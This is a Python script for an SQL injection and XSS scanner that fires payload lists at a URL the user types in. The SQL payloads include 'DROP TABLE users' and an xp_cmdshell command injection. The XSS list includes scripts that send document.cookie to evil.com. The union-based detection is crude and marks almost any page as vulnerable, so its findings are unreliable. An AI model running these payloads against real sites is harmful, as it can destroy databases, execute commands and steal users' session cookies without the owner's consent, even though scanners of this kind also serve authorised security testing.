import requests
import random
import time
import re
import urllib.parse
from colorama import Fore, Style

class AdvancedSQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads = self._load_payloads()
        
    def _load_payloads(self):
        return {
            'error_based': [
                "'",
                "''",
                "`",
                "``",
                ",",
                "\"",
                "\"\"",
                "/",
                "//",
                "\\",
                "\\\\",
                ";",
                "' or '",
                "' or 1--",
                "' or 1=1--",
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
                "') AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND ('1'='1",
                "')); WAITFOR DELAY '0:0:5'--",
                "1; DROP TABLE users--",
                "1'; DROP TABLE users--",
                "1'); DROP TABLE users--",
                "' OR EXISTS(SELECT * FROM information_schema.tables)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--"
            ],
            'time_based': [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "'); WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' OR 1=2--",
                "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
                "' AND (SELECT ASCII(SUBSTRING(@@version,1,1))) = 77--"
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version--",
                "' UNION SELECT user()--",
                "' UNION SELECT database()--",
                "' UNION SELECT table_name FROM information_schema.tables--"
            ]
        }
    
    def _send_request(self, url, payload=None):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        try:
            if payload:
                test_url = f"{url}{payload}"
            else:
                test_url = url
                
            response = self.session.get(test_url, headers=headers, timeout=10, verify=False)
            return response
        except:
            return None
    
    def _check_error_based(self, url):
        for payload in self.payloads['error_based']:
            response = self._send_request(url, payload)
            if response and any(error in response.text.lower() for error in ['sql', 'syntax', 'mysql', 'oracle', 'postgres', 'microsoft', 'odbc', 'driver']):
                self.vulnerabilities.append(f"Error-based SQLi with payload: {payload}")
                return True
        return False
    
    def _check_time_based(self, url):
        for payload in self.payloads['time_based']:
            start_time = time.time()
            self._send_request(url, payload)
            end_time = time.time()
            
            if end_time - start_time > 4:
                self.vulnerabilities.append(f"Time-based SQLi with payload: {payload}")
                return True
        return False
    
    def _check_boolean_based(self, url):
        normal_response = self._send_request(url)
        if not normal_response:
            return False
            
        for payload in self.payloads['boolean_based']:
            true_response = self._send_request(url, payload.replace('1=2', '1=1'))
            false_response = self._send_request(url, payload)
            
            if true_response and false_response and true_response.text != false_response.text:
                self.vulnerabilities.append(f"Boolean-based SQLi with payload: {payload}")
                return True
        return False
    
    def _check_union_based(self, url):
        for payload in self.payloads['union_based']:
            response = self._send_request(url, payload)
            if response and any(indicator in response.text.lower() for indicator in ['null', '1', '2', '3', 'version', 'user', 'database']):
                self.vulnerabilities.append(f"Union-based SQLi with payload: {payload}")
                return True
        return False
    
    def scan(self):
        print(f"{Fore.YELLOW}Starting advanced SQL injection scan on {self.target_url}{Style.RESET_ALL}")
        
        test_urls = [
            self.target_url,
            f"{self.target_url}?id=1",
            f"{self.target_url}?page=1",
            f"{self.target_url}?user=1",
            f"{self.target_url}?product=1"
        ]
        
        for test_url in test_urls:
            print(f"{Fore.CYAN}Testing URL: {test_url}{Style.RESET_ALL}")
            
            if self._check_error_based(test_url):
                print(f"{Fore.GREEN}Error-based SQLi detected!{Style.RESET_ALL}")
            
            if self._check_time_based(test_url):
                print(f"{Fore.GREEN}Time-based SQLi detected!{Style.RESET_ALL}")
            
            if self._check_boolean_based(test_url):
                print(f"{Fore.GREEN}Boolean-based SQLi detected!{Style.RESET_ALL}")
            
            if self._check_union_based(test_url):
                print(f"{Fore.GREEN}Union-based SQLi detected!{Style.RESET_ALL}")
        
        return self.vulnerabilities

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<script>document.location="http://evil.com/?c="+document.cookie</script>',
            '<script>fetch(\'http://evil.com/?c=\'+document.cookie)</script>',
            'javascript:alert(\'XSS\')',
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>'
        ]
    
    def scan(self):
        print(f"{Fore.YELLOW}Starting XSS scan on {self.target_url}{Style.RESET_ALL}")
        
        forms = self._extract_forms()
        for form in forms:
            self._test_form_xss(form)
        
        return self.vulnerabilities
    
    def _extract_forms(self):
        try:
            response = self.session.get(self.target_url, timeout=10)
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.IGNORECASE | re.DOTALL)
            return forms
        except:
            return []
    
    def _test_form_xss(self, form_html):
        inputs = re.findall(r'<input[^>]*>', form_html, re.IGNORECASE)
        for input_tag in inputs:
            if 'name=' in input_tag:
                name = re.search(r'name=[\'"]([^\'"]*)[\'"]', input_tag)
                if name:
                    for payload in self.payloads:
                        test_data = {name.group(1): payload}
                        try:
                            response = self.session.post(self.target_url, data=test_data, timeout=10)
                            if payload in response.text:
                                self.vulnerabilities.append(f"XSS found in form field {name.group(1)} with payload: {payload}")
                        except:
                            pass

def advanced_vuln_scanner():
    target = input(f"{Fore.WHITE}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Starting comprehensive vulnerability scan on {target}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}=================================================={Style.RESET_ALL}")
    
    sql_scanner = AdvancedSQLiScanner(target)
    sql_vulns = sql_scanner.scan()
    
    xss_scanner = XSSScanner(target)
    xss_vulns = xss_scanner.scan()
    
    print(f"\n{Fore.YELLOW}=================================================={Style.RESET_ALL}")
    print(f"{Fore.CYAN}Scan completed{Style.RESET_ALL}")
    
    if sql_vulns:
        print(f"{Fore.RED}SQL Injection vulnerabilities found:{Style.RESET_ALL}")
        for vuln in sql_vulns:
            print(f"{Fore.RED}  - {vuln}{Style.RESET_ALL}")
    
    if xss_vulns:
        print(f"{Fore.RED}XSS vulnerabilities found:{Style.RESET_ALL}")
        for vuln in xss_vulns:
            print(f"{Fore.RED}  - {vuln}{Style.RESET_ALL}")
    
    if not sql_vulns and not xss_vulns:
        print(f"{Fore.GREEN}No SQL Injection or XSS vulnerabilities found{Style.RESET_ALL}")
    
    input(f"\n{Fore.WHITE}Press Enter to return to main menu...{Style.RESET_ALL}")

if __name__ == "__main__":
    advanced_vuln_scanner()